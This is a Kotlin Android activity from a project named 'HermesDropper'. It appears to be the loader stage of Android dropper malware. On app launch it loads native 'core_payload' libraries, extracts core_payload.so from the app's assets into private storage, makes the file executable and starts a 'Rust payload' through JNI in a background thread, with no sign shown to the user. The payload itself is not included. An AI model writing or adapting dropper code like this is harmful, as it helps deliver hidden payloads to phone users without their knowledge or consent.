package com.example.hermesdropper

import android.os.Bundle
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import java.io.File
import java.io.FileOutputStream
import java.io.IOException
import com.example.dropper.R

class MainActivity : AppCompatActivity() {
    companion object {
        private const val TAG = "HermesDropper"
        private const val PAYLOAD_NAME = "core_payload.so"

        // Load native libraries (order matters to satisfy dependencies)
        init {
            try {
                System.loadLibrary("core_payload")
                System.loadLibrary("core_payload_jni")
            } catch (t: Throwable) {
                Log.e(TAG, "Failed to load native libraries", t)
            }
        }
    }

    // Native method that starts the Rust payload via JNI
    private external fun startPayload(): Int

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Start payload extraction and execution in a background thread
        Thread {
            try {
                extractAndRunPayload()
            } catch (e: Exception) {
                Log.e(TAG, "Error in payload execution: ${e.message}")
            }
        }.start()
    }

    private fun extractAndRunPayload() {
        try {
            // Extract the payload from assets (optional for JNI, kept for parity)
            val payloadFile = extractPayload()
            payloadFile?.setExecutable(true, true)

            // Start the payload via JNI
            val result = startPayload()
            Log.d(TAG, "Payload (JNI) execution completed with result: $result")
        } catch (e: Exception) {
            Log.e(TAG, "Error during payload execution: ${e.message}")
            e.printStackTrace()
        }
    }

    private fun extractPayload(): File? {
        return try {
            val inputStream = assets.open(PAYLOAD_NAME)
            val outputFile = File(applicationContext.filesDir, PAYLOAD_NAME)
            FileOutputStream(outputFile).use { output ->
                val buffer = ByteArray(4 * 1024)
                var read: Int
                while (inputStream.read(buffer).also { read = it } != -1) {
                    output.write(buffer, 0, read)
                }
                output.flush()
            }
            Log.d(TAG, "Payload extracted to: ${outputFile.absolutePath}")
            outputFile
        } catch (e: IOException) {
            Log.e(TAG, "Failed to extract payload: ${e.message}")
            e.printStackTrace()
            null
        }
    }
}